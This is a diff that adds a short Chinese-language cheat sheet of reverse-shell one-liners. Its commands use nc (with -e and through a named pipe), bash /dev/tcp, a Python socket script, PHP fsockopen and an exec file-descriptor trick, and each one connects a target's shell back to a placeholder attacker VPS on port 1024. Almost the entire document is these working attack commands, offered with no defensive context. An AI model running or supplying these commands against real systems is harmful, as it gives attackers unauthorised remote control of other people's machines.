@@ -1,0 +1,27 @@
+# nc反弹常用命令
+
+```bash
+用 nc 反弹，命令如下：
+
+nc <your_vps> 1024 -e /bin/sh
+某些目标的 nc 不支持 -e 参数，有两个解决思路，要么使用其他版本的 nc：
+
+nc.traditional <your_vps> 1024 -e /bin/sh
+要么配合命名管道进行反弹：
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc <your_vps> 1024 >/tmp/f
+用 bash 反弹：
+
+/bin/bash -i >& /dev/tcp/<your_vps>/1024 0>&1
+用 python 反弹：
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_vps>",1024));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+用 PHP 反弹：
+
+php -r '$sock=fsockopen("<your_vps>",1024);exec("/bin/sh -i <&3 >&3 2>&3");'
+用 exec 反弹：
+
+0<&196;exec 196<>/dev/tcp/<your_vps>/1024; sh <&196 >&196 2>&196
+
+```
+
